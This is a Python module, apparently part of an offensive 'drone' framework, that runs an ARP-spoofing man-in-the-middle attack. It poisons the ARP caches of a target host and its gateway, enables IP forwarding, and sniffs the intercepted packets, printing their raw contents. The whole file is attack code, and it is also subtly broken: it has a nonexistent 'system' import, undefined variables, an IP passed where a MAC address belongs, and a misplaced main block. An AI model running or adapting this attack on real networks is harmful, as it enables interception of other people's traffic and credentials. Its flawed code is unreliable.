from .DroneModuleFrame import DroneModuleFrame

class DroneModule(DroneModuleFrame):

    def __init__(self):
        name = "arpflood"
        options = {'targetIP': {'value': '-t', 'description': 'Target IP'}, \
                'gatewayIP': {'value': '-g', 'description': 'Gateway IP'}, \
                'interface': {'value': '-i', 'description': 'Network interface'}}
        DroneModuleFrame.__init__(self, name, options)

    def Analyze(self):
        print("I am analyzing stuff")

    def Exploit(self):
        import os
        import system
        import scapy.all
        print("I am exploiting stuff")

        ''' Get MACs '''
        def MACgetter(IP):
            ans,unans = arping(IP)
            for s, r in ans:
                return r[Ether].src

        ''' Send ARP packets  '''
        def Flood(gatewayIP,targetIP):
            targetMAC = MACgetter(targetIP)
            gatewayMAC = MACgetter(gatewayIP)
            send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst=targetIP))
            send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst=gatewayMAC))

        ''' Reupdate routing tables so they can actually use internet '''
        def Reupdate(gatewayIP,targetIP):
            targetMAC = MACgetter(targetIP)
            gatewayMAC = MACgetter(gatewayIP)
            send(ARP(op=2, pdst=gatewayIP,psrc=targetIP,hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetMAC), count=4)
            send(ARP(op=2,pdst=targetIP,psrc=gatewayIP,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gatewayMAC), count=4)

        ''' Watch packets '''
        def BigBro():
            pkts = sniff(iface=interface, count=10, prn=lambda x:x.sprintf((" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Receiver: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n")))

        ''' MitM attack '''
        def Mitm():
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            while 1:
                try:
                    Flood(gatewayIP,targetIP)
                    time.sleep(1)
                    BigBro()
                except KeyboardInterrupt:
                    Reupdate(gatewayIP,targetIP)
                    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                    sys.exit(1)

    if __name__ == "__main__":
        Mitm()
